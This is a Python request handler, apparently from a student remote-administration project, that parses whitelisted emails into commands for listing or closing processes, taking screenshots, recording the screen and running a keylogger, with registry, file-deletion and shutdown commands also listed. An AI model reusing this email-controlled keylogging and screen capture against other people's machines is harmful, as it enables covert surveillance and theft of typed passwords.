from operator import truediv
import os, re
from xmlrpc.client import Boolean
from .html_generator import HTML_Generator
from services.mac import Mac
from services.help import Help
from services.keylogger import KeyLogger
from services.screen import Screen
from services.app import AppRunning
from services.process import Process

commands_basic = ['HELP','MAC','APP','PROCESS','SCREEN','KEYLOGGER']
commands_advance = ['HELP','REGISTRY','EXPLORER','SYSTEM']
commands = [   
    'MAC get'
    'APP get',
    'APP close <ID>'
    'PROCESS get',
    'PROCESS close <ID>'
    'SCREEN getscreenshot',
    'SCREEN getrecord <seconds>'
    'KEYLOGGER getkeypress <seconds>'

    'REGISTRY get value <key>',
    'REGISTRY edit value <value>',
    'REGISTRY delete value <key>',
    'REGISTRY get key <key>',
    'REGISTRY delete key <key>'
    'EXPLORER get',
    'EXPLORER copy file <path>',
    'EXPLORER move file <path> to <path>',
    'EXPLORER delete file <path>',
    'EXPLORER copy folder <path>',
    'EXPLORER move folder <path>',
    'EXPLORER delete folder <path>'

    'SYSTEM shutdown',
    'SYSTEM restart',
]

class RequestHandle:
    def __init__(self):
        pass
    def __read_whitelist(self):
        emails = []
        try:
            with open("whitelist.txt", "r") as credentials:
                for line in credentials:
                    mail = line.replace("\n", "").split(",")
                    emails.append({'email':mail[0],'role':int(mail[1])})
                credentials.close()
                return emails
        except FileNotFoundError:
            return []
    def parse_request(self,mail):
        global commands_basic
        global commands_advance   
        mail_req = mail['sender']
        whiteList = self.__read_whitelist()
        # Check email
        isValid = False
        for mail_valid in whiteList:
            if(mail_req == mail_valid['email']): 
                isValid = True
                mail_req = mail_valid
        if(isValid == False):
            return {'msg':"Email không hợp lệ",'command':mail['subject']}
        # Check role
        subject_components = mail['subject'].split(" ")
        isValid = False
        group_req = subject_components[1]
        # print('role',mail_req)
        if(
            (group_req in commands_basic and mail_req['role'] == 0) 
            or
            (group_req in commands_advance and mail_req['role'] == 1)
        ):
            isValid = True
        if(isValid == False):
            return {'msg':"Email "+mail_req['email']+" không có quyền sử dụng câu lệnh này",'command':mail['subject']}
        # Check command    
        isValid = False
        if(group_req == "HELP"):
            h = Help()
            return {
                'function': h.show_help,
                'params': None,
                'msg': 'Lấy danh sách lệnh',
                'command': mail['subject']
            }
        if(group_req == "MAC"):
            cmd = subject_components[2]
            if(cmd == "get" and len(subject_components) == 3):
                mac = Mac()
                return {
                    'function': mac.get_mac,
                    'params': None,
                    'msg': 'Lấy địa chỉ Mac',
                    'command': mail['subject']
                }
        if(group_req == "APP"):
            cmd = subject_components[2]
            app_running = AppRunning()
            if(cmd == "get" and len(subject_components) == 3):
                return {
                    'function': app_running.get_apps,
                    'params': None,
                    'msg': 'Lấy danh sách ứng dụng đang chạy',
                    'command': mail['subject']
                }
            if(cmd == "close" and len(subject_components) == 4):
                return {
                    'function': app_running.close_app,
                    'params': [subject_components[3]],
                    'msg': 'Đóng ứng dụng đang chạy có ID là '+ subject_components[3],
                    'command': mail['subject']
                }
        if(group_req == "PROCESS"):
            cmd = subject_components[2]
            process = Process()
            if(cmd == "get" and len(subject_components) == 3):
                return {
                    'function': process.get_apps,
                    'params': None,
                    'msg': 'Lấy danh sách tiến trình đang chạy',
                    'command': mail['subject']
                }
            if(cmd == "close" and len(subject_components) == 4):
                return {
                    'function': process.close_app,
                    'params': [subject_components[3]],
                    'msg': 'Đóng tiến trình đang chạy có ID là '+ subject_components[3],
                    'command': mail['subject']
                }
        if(group_req == "KEYLOGGER"):
            cmd = subject_components[2]
            keylog = KeyLogger()
            if(cmd == "getkeypress" and len(subject_components) == 4):
                return {
                    'function': keylog.get_key_log,
                    'params': [subject_components[3]],
                    'msg': 'Lấy chuỗi các phím đã gõ trong '+str(subject_components[3])+' giây',
                    'command': mail['subject']
                }
        if(group_req == "SCREEN"):
            cmd = subject_components[2]
            screen = Screen()
            if(cmd == "getscreenshot" and len(subject_components) == 3):
                return {
                    'function': screen.get_screen_shot,
                    'params': None,
                    'msg': 'Chụp ảnh màn hình',
                    'command': mail['subject']
                }
            if(cmd == "getrecord" and len(subject_components) == 4):
                return {
                    'function': screen.get_screen_recorder,
                    'params': [subject_components[3]],
                    'msg': 'Chụp ảnh màn hình',
                    'command': mail['subject']
                }
        return {'msg':"Cú pháp lệnh không hợp lệ",'command':mail['subject']}

